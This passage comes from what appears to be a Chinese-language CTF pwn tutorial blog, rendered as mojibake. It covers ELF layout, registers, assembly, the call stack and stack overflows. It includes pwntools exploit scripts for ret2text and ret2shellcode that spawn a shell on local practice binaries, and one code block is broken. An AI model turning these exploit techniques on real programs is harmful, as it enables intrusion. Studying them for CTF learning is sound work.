</p><ul><li>è™šæ‹Ÿå†…å­˜ç”¨æˆ·ç©ºé—´æ¯ä¸ªè¿›ç¨‹ä¸€ä»½</li><li>è™šæ‹Ÿå†…å­˜å†…æ ¸ç©ºé—´æ‰€æœ‰è¿›ç¨‹å…±äº«ä¸€ä»½</li><li>è™šæ‹Ÿå†…å­˜ mmap æ®µä¸­çš„åŠ¨æ€é“¾æ¥åº“ä»…åœ¨ç‰©ç†å†…å­˜ä¸­è£…è½½ä¸€ä»½</li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/6441eaa30b474add83de904cbda9734a.png" alt="image-20220120152751897" style="zoom:67%;"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/cd9c8303ce3452e633fc07f5fd5776e0.png" alt="image-20220120152843731" style="zoom:50%;"></p><p><strong>ç£ç›˜ä¸­çš„ELFï¼ˆå¯æ‰§è¡Œæ–‡ä»¶ï¼‰ä¸å†…å­˜ä¸­çš„ELFï¼ˆè¿›ç¨‹å†…å­˜æ˜ åƒï¼‰</strong> </p><p><img src="/2022/01/19/CTF/Pwn/Pwn/2ddf517f9f2981568c4c06ed68f2b371.png" alt="image-20220406180913602"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/198d1d761b2e9a1b4330e7fbfeb70122.png" alt="image-20220406180644137"></p><p><strong>æ®µï¼ˆsegmentï¼‰ä¸èŠ‚ï¼ˆsectionï¼‰</strong></p><ul><li>ä¸€ä¸ª <strong>æ®µ</strong> åŒ…å«å¤šä¸ª <strong>èŠ‚</strong></li><li>æ®µè§†å›¾ç”¨äº<strong>è¿›ç¨‹çš„å†…å­˜</strong>åŒºåŸŸçš„ <strong>rwx æƒé™åˆ’åˆ†</strong></li><li><p>èŠ‚è§†å›¾ç”¨äº<strong>ELFæ–‡ä»¶</strong>ç¼–è¯‘é“¾æ¥æ—¶ä¸åœ¨<strong>ç£ç›˜</strong>ä¸Šå­˜å‚¨æ—¶çš„<strong>æ–‡ä»¶ç»“æ„</strong>çš„ç»„ç»‡</p></li><li><p>ä»£ç æ®µï¼ˆText segmentï¼‰åŒ…å«äº†ä»£ç ä¸åªè¯»æ•°æ®</p><ul><li><strong>.text èŠ‚</strong></li><li>.rodata èŠ‚ </li><li>.hash èŠ‚ </li><li>.dynsym èŠ‚ </li><li>.dynstr èŠ‚ </li><li>.<strong>plt èŠ‚</strong></li><li>.rel.got èŠ‚ </li><li>â€¦â€¦</li></ul></li><li><p>æ•°æ®æ®µï¼ˆData segmentï¼‰åŒ…å«äº†å¯è¯»å¯å†™æ•°æ®</p><ul><li>.data èŠ‚ </li><li>.dynamic èŠ‚ </li><li>.got èŠ‚ </li><li><strong>.got.plt èŠ‚</strong></li><li><strong>.bss èŠ‚</strong></li><li>â€¦â€¦</li></ul></li><li><p>æ ˆæ®µï¼ˆStack segmentï¼‰</p></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/31f049ee54ba43a4dfcfef96b81a5876.png" alt="image-20220120153432565" style="zoom:67%;"></p><h3 id="4ã€ç¨‹åºçš„è£…è½½ä¸è¿›ç¨‹çš„æ‰§è¡Œ"><a href="#4ã€ç¨‹åºçš„è£…è½½ä¸è¿›ç¨‹çš„æ‰§è¡Œ" class="headerlink" title="4ã€ç¨‹åºçš„è£…è½½ä¸è¿›ç¨‹çš„æ‰§è¡Œ"></a>4ã€ç¨‹åºçš„è£…è½½ä¸è¿›ç¨‹çš„æ‰§è¡Œ</h3><p><strong>å°ç«¯åºä¸å¤§ç«¯åº</strong></p><ul><li><p>å°ç«¯åº</p><ul><li>ä½åœ°å€å­˜æ”¾æ•°æ®ä½ä½ã€é«˜åœ°å€å­˜æ”¾æ•°æ®é«˜ä½</li><li>æˆ‘ä»¬æ‰€ä¸»è¦å…³æ³¨çš„æ ¼å¼</li></ul></li><li><p>å¤§ç«¯åº</p><ul><li>ä½åœ°å€å­˜æ”¾æ•°æ®é«˜ä½ã€é«˜åœ°å€å­˜æ”¾æ•°æ®ä½ä½</li></ul></li></ul><p><strong>amd64å¯„å­˜å™¨ç»“æ„</strong></p><ul><li>raxï¼š 8Bytes</li><li>eaxï¼š4Bytes</li><li>axï¼š 2Bytes</li><li>ahï¼š 1Bytes</li><li>alï¼š  1Bytes</li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/d6526b81f2f8e1c28cc07843f8745f0b.png" alt="image-20220406174621225"></p><p><strong>éƒ¨åˆ†å¯„å­˜å™¨çš„åŠŸèƒ½</strong></p><ul><li><p>RIP</p><ul><li>å­˜æ”¾å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€</li></ul></li><li><p>RSP</p><ul><li>å­˜æ”¾å½“å‰æ ˆå¸§çš„æ ˆé¡¶åœ°å€</li></ul></li><li><p>RBP</p><ul><li>å­˜æ”¾å½“å‰æ ˆå¸§çš„æ ˆåº•åœ°å€</li></ul></li><li><p>RAX</p><ul><li>é€šç”¨å¯„å­˜å™¨ã€‚å­˜æ”¾å‡½æ•°è¿”å›å€¼</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/8e0c5c69bd5fbfe4ad88f1a586cce0ae.png" alt="image-20220405222925297"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/f5d09e35d719712d53122860bb31ae4f.png" alt="image-20220405222954888"></p><h3 id="5ã€x86-amp-amd64æ±‡ç¼–ç®€è¿°"><a href="#5ã€x86-amp-amd64æ±‡ç¼–ç®€è¿°" class="headerlink" title="5ã€x86&amp;amd64æ±‡ç¼–ç®€è¿°"></a>5ã€x86&amp;amd64æ±‡ç¼–ç®€è¿°</h3><p><strong>å¸¸ç”¨æ±‡ç¼–æŒ‡ä»¤ï¼š</strong></p><p>MOVã€LEAã€ADD/SUBã€PUSHã€POPã€CMPã€JMPã€J[Condition]ã€CALLã€LEAVEã€RETâ€¦â€¦</p><p><strong>MOV</strong></p><ul><li>MOV DEST, SRC        ; æŠŠæºæ“ä½œæ•°ä¼ é€ç»™ç›®æ ‡</li><li>MOV EAX,1234H   ; æ‰§è¡Œç»“æœï¼ˆEAXï¼‰ = 1234H</li><li>MOV EBX, EAX </li><li>MOV EAX, [00404011H] ; [ ] è¡¨ç¤ºå–åœ°å€å†…çš„å€¼</li><li>MOV EAX, [ESI] </li></ul><p><strong>LEA</strong></p><ul><li>LEA REG, SRC          ; æŠŠæºæ“ä½œæ•°çš„æœ‰æ•ˆåœ°å€é€ç»™æŒ‡å®šçš„å¯„å­˜å™¨</li><li>LEA EBX, ASC          ; å– ASC çš„åœ°å€å­˜æ”¾è‡³ EBX å¯„å­˜å™¨ä¸­</li><li>LEA EAX, 6[ESI]         ; æŠŠ ESI+6 å•å…ƒçš„32ä½åœ°å€é€ç»™ EAX </li></ul><p><strong>PUSH</strong></p><ul><li>PUSH VALUE         ; æŠŠç›®æ ‡å€¼å‹æ ˆï¼ŒåŒæ—¶SPæŒ‡é’ˆ-1å­—é•¿</li><li>PUSH 1234H </li><li>PUSH EAX</li></ul><p><strong>POP</strong></p><ul><li>POP DEST ; å°†æ ˆé¡¶çš„å€¼å¼¹å‡ºè‡³ç›®çš„å­˜å‚¨ä½ç½®ï¼ŒåŒæ—¶SPæŒ‡é’ˆ+1å­—é•¿</li><li>POP EAX</li></ul><p><strong>LEAVE</strong></p><ul><li>åœ¨å‡½æ•°è¿”å›æ—¶ï¼Œæ¢å¤çˆ¶å‡½æ•°æ ˆå¸§çš„æŒ‡ä»¤</li><li>ç­‰æ•ˆäºï¼š<ul><li>MOV ESP, EBP</li><li>POP EBP</li></ul></li></ul><p><strong>RET</strong></p><ul><li><p>åœ¨å‡½æ•°è¿”å›æ—¶ï¼Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµè¿”å›çˆ¶å‡½æ•°çš„æŒ‡ä»¤</p></li><li><p>ç­‰æ•ˆäºï¼šPOP RIPï¼ˆè¿™æ¡æŒ‡ä»¤å®é™…æ˜¯ä¸å­˜åœ¨çš„ï¼Œä¸èƒ½ç›´æ¥å‘RIPå¯„å­˜å™¨ä¼ é€æ•°æ®ï¼‰</p></li></ul><p><strong>ä¸¤ç§æ±‡ç¼–æ ¼å¼ï¼š</strong></p><div class="table-container"><table><thead><tr><th>intel</th><th>AT&amp;T</th></tr></thead><tbody><tr><td>mov  eax, 8</td><td>movl  $8, %eax</td></tr><tr><td>mov  ebx, 0ffffh</td><td>movl  $0xffff, %ebx</td></tr><tr><td>int  80h</td><td>int  $80</td></tr><tr><td>mov  eax, [ecx]</td><td>movl  (%ecx), %eax</td></tr></tbody></table></div><p><img src="/2022/01/19/CTF/Pwn/Pwn/1e9b520c251c9b722d2f7655f3ef5de1.png" alt="image-20220405223206766"></p><h2 id="0x02-æ ˆæº¢å‡º"><a href="#0x02-æ ˆæº¢å‡º" class="headerlink" title="0x02 æ ˆæº¢å‡º"></a>0x02 æ ˆæº¢å‡º</h2><h3 id="1ã€Cè¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ"><a href="#1ã€Cè¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ" class="headerlink" title="1ã€Cè¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ"></a>1ã€Cè¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ</h3><ul><li><p>å‡½æ•°è°ƒç”¨æ ˆæ˜¯æŒ‡ç¨‹åºè¿è¡Œæ—¶å†…å­˜ä¸€æ®µè¿ç»­çš„åŒºåŸŸ</p></li><li><p>ç”¨æ¥ä¿å­˜å‡½æ•°è¿è¡Œæ—¶çš„çŠ¶æ€ä¿¡æ¯ï¼ŒåŒ…æ‹¬å‡½æ•°å‚æ•°ä¸å±€éƒ¨å˜é‡ç­‰</p></li><li><p>ç§°ä¹‹ä¸ºâ€œæ ˆâ€æ˜¯å› ä¸ºå‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œè°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„çŠ¶æ€è¢«ä¿å­˜åœ¨æ ˆå†…ï¼Œè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€è¢«å‹å…¥è°ƒç”¨æ ˆçš„æ ˆé¡¶</p></li><li><p>åœ¨å‡½æ•°è°ƒç”¨ç»“æŸæ—¶ï¼Œæ ˆé¡¶çš„å‡½æ•°ï¼ˆcalleeï¼‰çŠ¶æ€è¢«å¼¹å‡ºï¼Œæ ˆé¡¶æ¢å¤åˆ°è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„çŠ¶æ€</p></li><li><p>å‡½æ•°è°ƒç”¨æ ˆåœ¨å†…å­˜ä¸­ä»é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿ï¼Œæ‰€ä»¥æ ˆé¡¶å¯¹åº”çš„å†…å­˜åœ°å€åœ¨å‹æ ˆæ—¶å˜å°ï¼Œé€€æ ˆæ—¶å˜å¤§</p></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/73bc74be726ca183746fad65712e77fd.png" alt="image-20220121142507825"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/34fae6734a56d2a74e26d5d003559eeb.png" alt="image-20220410130656233"></p><p><strong>å‡½æ•°çŠ¶æ€ä¸»è¦æ¶‰åŠä¸‰ä¸ªå¯„å­˜å™¨ â€”â€” espï¼Œebpï¼Œeip</strong></p><ul><li>esp ç”¨æ¥å­˜å‚¨å‡½æ•°è°ƒç”¨æ ˆçš„æ ˆé¡¶åœ°å€ï¼Œåœ¨å‹æ ˆå’Œé€€æ ˆæ—¶å‘ç”Ÿå˜åŒ–ã€‚</li><li>ebp ç”¨æ¥å­˜å‚¨å½“å‰å‡½æ•°çŠ¶æ€çš„åŸºåœ°å€ï¼Œåœ¨å‡½æ•°è¿è¡Œæ—¶ä¸å˜ï¼Œå¯ä»¥ç”¨æ¥ç´¢å¼•ç¡®å®šå‡½æ•°å‚æ•°æˆ–å±€éƒ¨å˜é‡çš„ä½ç½®ã€‚</li><li>eip ç”¨æ¥å­˜å‚¨å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤çš„åœ°å€ï¼Œcpu ä¾ç…§ eip çš„å­˜å‚¨å†…å®¹è¯»å–æŒ‡ä»¤å¹¶æ‰§è¡Œï¼Œeip éšä¹‹æŒ‡å‘ç›¸é‚»çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œå¦‚æ­¤åå¤ï¼Œç¨‹åºå°±å¾—ä»¥è¿ç»­æ‰§è¡ŒæŒ‡ä»¤ã€‚</li></ul><p><strong>å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œæ ˆé¡¶å‡½æ•°çŠ¶æ€ä»¥åŠä¸Šè¿°å¯„å­˜å™¨çš„å˜åŒ–</strong></p><blockquote><p>å˜åŒ–çš„æ ¸å¿ƒä»»åŠ¡æ˜¯å°†è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„çŠ¶æ€ä¿å­˜èµ·æ¥ï¼ŒåŒæ—¶åˆ›å»ºè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€ã€‚</p></blockquote><ul><li><p>é¦–å…ˆå°†è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„å‚æ•°æŒ‰ç…§é€†åºä¾æ¬¡å‹å…¥æ ˆå†…ã€‚å¦‚æœè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰ä¸éœ€è¦å‚æ•°ï¼Œåˆ™æ²¡æœ‰è¿™ä¸€æ­¥éª¤ã€‚è¿™äº›å‚æ•°ä»ä¼šä¿å­˜åœ¨è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„å‡½æ•°çŠ¶æ€å†…ï¼Œä¹‹åå‹å…¥æ ˆå†…çš„æ•°æ®éƒ½ä¼šä½œä¸ºè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„å‡½æ•°çŠ¶æ€æ¥ä¿å­˜ã€‚</p></li><li><p>ç„¶åå°†è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰è¿›è¡Œè°ƒç”¨ä¹‹åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ä½œä¸ºè¿”å›åœ°å€å‹å…¥æ ˆå†…ã€‚è¿™æ ·è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„ eipï¼ˆæŒ‡ä»¤ï¼‰ä¿¡æ¯å¾—ä»¥ä¿å­˜ã€‚</p></li><li><p>å†å°†å½“å‰çš„ebp å¯„å­˜å™¨çš„å€¼ï¼ˆä¹Ÿå°±æ˜¯è°ƒç”¨å‡½æ•°çš„åŸºåœ°å€ï¼‰å‹å…¥æ ˆå†…ï¼Œå¹¶å°† ebp å¯„å­˜å™¨çš„å€¼æ›´æ–°ä¸ºå½“å‰æ ˆé¡¶çš„åœ°å€ã€‚è¿™æ ·è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„ ebpï¼ˆåŸºåœ°å€ï¼‰ä¿¡æ¯å¾—ä»¥ä¿å­˜ã€‚åŒæ—¶ï¼Œebp è¢«æ›´æ–°ä¸ºè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„åŸºåœ°å€ã€‚</p></li><li><p>å†ä¹‹åæ˜¯å°†è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„å±€éƒ¨å˜é‡ç­‰æ•°æ®å‹å…¥æ ˆå†…ã€‚</p></li><li><p>åœ¨å‹æ ˆçš„è¿‡ç¨‹ä¸­ï¼Œesp å¯„å­˜å™¨çš„å€¼ä¸æ–­å‡å°ï¼ˆå¯¹åº”äºæ ˆä»å†…å­˜é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿ï¼‰ã€‚å‹å…¥æ ˆå†…çš„æ•°æ®åŒ…æ‹¬è°ƒç”¨å‚æ•°ã€è¿”å›åœ°å€ã€è°ƒç”¨å‡½æ•°çš„åŸºåœ°å€ï¼Œä»¥åŠå±€éƒ¨å˜é‡ï¼Œå…¶ä¸­è°ƒç”¨å‚æ•°ä»¥å¤–çš„æ•°æ®å…±åŒæ„æˆäº†è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€ã€‚åœ¨å‘ç”Ÿè°ƒç”¨æ—¶ï¼Œç¨‹åºè¿˜ä¼šå°†è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„æŒ‡ä»¤åœ°å€å­˜åˆ° eip å¯„å­˜å™¨å†…ï¼Œè¿™æ ·ç¨‹åºå°±å¯ä»¥ä¾æ¬¡æ‰§è¡Œè¢«è°ƒç”¨å‡½æ•°çš„æŒ‡ä»¤äº†ã€‚</p></li></ul><p><strong>å‡½æ•°è°ƒç”¨ç»“æŸæ—¶çš„å˜åŒ–</strong></p><blockquote><p>å˜åŒ–çš„æ ¸å¿ƒä»»åŠ¡æ˜¯ä¸¢å¼ƒè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€ï¼Œå¹¶å°†æ ˆé¡¶æ¢å¤ä¸ºè°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„çŠ¶æ€ã€‚</p></blockquote><ul><li><p>é¦–å…ˆè¢«è°ƒç”¨å‡½æ•°çš„å±€éƒ¨å˜é‡ä¼šä»æ ˆå†…ç›´æ¥å¼¹å‡ºï¼Œæ ˆé¡¶ä¼šæŒ‡å‘è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„åŸºåœ°å€ã€‚</p></li><li><p>ç„¶åå°†åŸºåœ°å€å†…å­˜å‚¨çš„è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„åŸºåœ°å€ä»æ ˆå†…å¼¹å‡ºï¼Œå¹¶å­˜åˆ° ebp å¯„å­˜å™¨å†…ã€‚è¿™æ ·è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„ ebpï¼ˆåŸºåœ°å€ï¼‰ä¿¡æ¯å¾—ä»¥æ¢å¤ã€‚æ­¤æ—¶æ ˆé¡¶ä¼šæŒ‡å‘è¿”å›åœ°å€ã€‚</p></li><li><p>å†å°†è¿”å›åœ°å€ä»æ ˆå†…å¼¹å‡ºï¼Œå¹¶å­˜åˆ° eip å¯„å­˜å™¨å†…ã€‚è¿™æ ·è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„ eipï¼ˆæŒ‡ä»¤ï¼‰ä¿¡æ¯å¾—ä»¥æ¢å¤ã€‚</p></li><li><p>è‡³æ­¤è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„å‡½æ•°çŠ¶æ€å°±å…¨éƒ¨æ¢å¤äº†ï¼Œä¹‹åå°±æ˜¯ç»§ç»­æ‰§è¡Œè°ƒç”¨å‡½æ•°çš„æŒ‡ä»¤äº†ã€‚</p></li></ul><p><strong>å‡½æ•°è°ƒç”¨æ ˆçš„å·¥ä½œæ–¹å¼ï¼ˆcdeclï¼‰</strong></p><ul><li>x86<ul><li>ä½¿ç”¨æ ˆæ¥ä¼ é€’å‚æ•°</li><li>ä½¿ç”¨ eax å­˜æ”¾è¿”å›å€¼</li></ul></li><li>amd64<ul><li>å‰6ä¸ªå‚æ•°ä¾æ¬¡å­˜æ”¾äº rdiã€rsiã€rdxã€rcxã€r8ã€r9 å¯„å­˜å™¨ä¸­</li><li>ç¬¬7ä¸ªä»¥åçš„å‚æ•°å­˜æ”¾äºæ ˆä¸­</li></ul></li></ul><p><strong>ç¼“å†²åŒºæº¢å‡ºï¼ˆBuffer overflowï¼‰</strong></p><blockquote><p>æœ¬è´¨æ˜¯å‘å®šé•¿çš„ç¼“å†²åŒºä¸­å†™å…¥äº†è¶…é•¿çš„æ•°æ®ï¼Œé€ æˆè¶…å‡ºçš„æ•°æ®è¦†å†™äº†åˆæ³•å†…å­˜åŒºåŸŸ</p></blockquote><ul><li><p>æ ˆæº¢å‡ºï¼ˆStack overflowï¼‰</p><ul><li>æœ€å¸¸è§ã€æ¼æ´æ¯”ä¾‹æœ€é«˜ã€å±å®³æœ€å¤§çš„äºŒè¿›åˆ¶æ¼æ´</li><li>åœ¨ CTF PWN ä¸­å¾€å¾€æ˜¯æ¼æ´åˆ©ç”¨çš„åŸºç¡€</li></ul></li><li><p>å †æº¢å‡ºï¼ˆHeap overflowï¼‰</p><ul><li>å †ç®¡ç†å™¨å¤æ‚ï¼Œåˆ©ç”¨èŠ±æ ·ç¹å¤š</li><li>CTF PWN ä¸­çš„å¸¸è§é¢˜å‹</li></ul></li><li><p>Dataæ®µæº¢å‡º</p><ul><li>æ”»å‡»æ•ˆæœä¾èµ–äº Dataæ®µä¸Šå­˜æ”¾äº†ä½•ç§æ§åˆ¶æ•°æ®</li></ul></li></ul><p>ä»‹ç»å®ŒèƒŒæ™¯çŸ¥è¯†ï¼Œå°±å¯ä»¥ç»§ç»­å›å½’æ ˆæº¢å‡ºæ”»å‡»çš„ä¸»é¢˜äº†ã€‚å½“å‡½æ•°æ­£åœ¨æ‰§è¡Œå†…éƒ¨æŒ‡ä»¤çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬æ— æ³•æ‹¿åˆ°ç¨‹åºçš„æ§åˆ¶æƒï¼Œåªæœ‰åœ¨å‘ç”Ÿå‡½æ•°è°ƒç”¨æˆ–è€…ç»“æŸå‡½æ•°è°ƒç”¨æ—¶ï¼Œç¨‹åºçš„æ§åˆ¶æƒä¼šåœ¨å‡½æ•°çŠ¶æ€ä¹‹é—´å‘ç”Ÿè·³è½¬ï¼Œè¿™æ—¶æ‰å¯ä»¥é€šè¿‡ä¿®æ”¹å‡½æ•°çŠ¶æ€æ¥å®ç°æ”»å‡»ã€‚è€Œæ§åˆ¶ç¨‹åºæ‰§è¡ŒæŒ‡ä»¤æœ€å…³é”®çš„å¯„å­˜å™¨å°±æ˜¯ eipï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è®© eip è½½å…¥æ”»å‡»æŒ‡ä»¤çš„åœ°å€ã€‚</p><p>å…ˆæ¥çœ‹çœ‹å‡½æ•°è°ƒç”¨ç»“æŸæ—¶ï¼Œå¦‚æœè¦è®© eip æŒ‡å‘æ”»å‡»æŒ‡ä»¤ï¼Œéœ€è¦å“ªäº›å‡†å¤‡ï¼Ÿé¦–å…ˆï¼Œåœ¨é€€æ ˆè¿‡ç¨‹ä¸­ï¼Œè¿”å›åœ°å€ä¼šè¢«ä¼ ç»™ eipï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©æº¢å‡ºæ•°æ®ç”¨æ”»å‡»æŒ‡ä»¤çš„åœ°å€æ¥è¦†ç›–è¿”å›åœ°å€å°±å¯ä»¥äº†ã€‚å…¶æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æº¢å‡ºæ•°æ®å†…åŒ…å«ä¸€æ®µæ”»å‡»æŒ‡ä»¤ï¼Œä¹Ÿå¯ä»¥åœ¨å†…å­˜å…¶ä»–ä½ç½®å¯»æ‰¾å¯ç”¨çš„æ”»å‡»æŒ‡ä»¤ã€‚</p><p><img src="/2022/01/19/CTF/Pwn/Pwn/48d4fa4dd9ab1a5f7426e4eef3642de9.png" alt="image-20220121143254140" style="zoom:67%;"></p><ul><li><p>ret2textï¼šç¯¡æ”¹æ ˆå¸§ä¸Šçš„è¿”å›åœ°å€ä¸ºç¨‹åºä¸­å·²æœ‰çš„åé—¨å‡½æ•°</p><ul><li><p>ret_addr = backdoor_addr</p></li><li><p>```c<br>int get_shell()<br>{</p><pre><code>system(&quot;/bin/sh&quot;); //ç›¸å½“äºåœ¨ç»ˆç«¯ï¼ˆshellï¼‰ä¸­æ‰§è¡Œ/bin/shï¼Œå¾—åˆ°ä¸€ä¸ªshellreturn 0;</code></pre><p>}</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br>- ret2shellcodeï¼šç¯¡æ”¹æ ˆå¸§ä¸Šçš„è¿”å›åœ°å€ä¸ºæ”»å‡»è€…æ‰‹åŠ¨ä¼ å…¥çš„ <span class="hljs-keyword">shellcode </span>æ‰€åœ¨ç¼“å†²åŒºåœ°å€<br>  - ret_addr = <span class="hljs-keyword">shellcode_addr</span><br><span class="hljs-keyword"></span>  - åˆæœŸå¾€å¾€å°† <span class="hljs-keyword">shellcode </span>ç›´æ¥å†™å…¥æ ˆç¼“å†²åŒº<br>  - ç›®å‰ç”±äº the NX <span class="hljs-keyword">bits </span>ä¿æŠ¤æªæ–½çš„å¼€å¯ï¼Œæ ˆç¼“å†²åŒºä¸å¯æ‰§è¡Œï¼Œæ•…å½“ä¸‹çš„å¸¸ç”¨æ‰‹æ®µå˜ä¸ºå‘ <span class="hljs-keyword">bss </span>ç¼“å†²åŒºå†™å…¥ <span class="hljs-keyword">shellcode </span>æˆ–å‘å †ç¼“å†²åŒºå†™å…¥ <span class="hljs-keyword">shellcode </span>å¹¶ä½¿ç”¨ mprotect èµ‹äºˆå…¶å¯æ‰§è¡Œæƒé™<br><br><br><br><span class="hljs-comment">### 2ã€ret2text</span><br><br>**æŸ¥çœ‹é˜²æŠ¤æªæ–½ï¼š**<br><br>```<span class="hljs-keyword">shell</span><br><span class="hljs-keyword"></span>$ checksec ret2text<br></code></pre></td></tr></table></figure></li></ul></li></ul><p><strong>gdb è°ƒè¯•ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb ret2text</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æ‰“æ–­ç‚¹</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b main <span class="hljs-comment"># å‡½æ•°</span></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b *0x8048000 <span class="hljs-comment"># åœ°å€</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> è¿è¡Œã€è¿›å…¥ã€ä¸‹ä¸€ä¸ª</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> r <span class="hljs-comment"># run</span></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> s <span class="hljs-comment"># step in</span></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> n <span class="hljs-comment"># next</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æŸ¥çœ‹æ ˆ</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> stack 24</span><br><br></code></pre></td></tr></table></figure><p><strong>exp.pyï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2text&quot;</span>)<br>io.recvline()<br><br>get_shell_addr = <span class="hljs-number">0x8048522</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">b&#x27;BBBB&#x27;</span> + p32(get_shell_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="3ã€ret2shellcode"><a href="#3ã€ret2shellcode" class="headerlink" title="3ã€ret2shellcode"></a>3ã€ret2shellcode</h3><p><strong>ç”Ÿæˆ shellcodeï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 32 bit</span><br>shellcraft.sh()<br><span class="hljs-built_in">print</span>(shellcraft.sh())<br><br>asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(asm(shellcraft.sh()))<br><br><span class="hljs-comment"># 64 bit</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>shellcraft.amd64.sh()<br></code></pre></td></tr></table></figure><p><strong>exp.pyï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2shellcode&quot;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span 